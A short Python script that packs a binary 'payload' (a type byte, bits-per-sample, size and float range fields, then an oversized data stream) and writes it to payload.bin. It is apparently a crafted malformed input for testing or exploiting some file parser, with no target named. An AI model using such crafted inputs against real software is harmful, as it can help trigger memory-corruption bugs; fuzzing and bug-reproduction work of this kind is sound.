import struct

payload = b"\x07"
payload += struct.pack(">I", 8)     # bps = 8
payload += struct.pack(">I", 5)     # size0 = 5
payload += struct.pack(">f", 0.0)   # r0
payload += struct.pack(">f", 1.0)   # r1
payload += struct.pack(">f", 0.0)   # d0
payload += struct.pack(">f", 1.0)   # d1
# payload += b"\xff\xff\xff\x00\x00"  # stream

payload += b"\xff\xff\xff\x00\x00\x00\x00\x00"*1 + b"\x00\x00\x00\x00"*5  # stream

with open("payload.bin", "wb") as f:
    f.write(payload)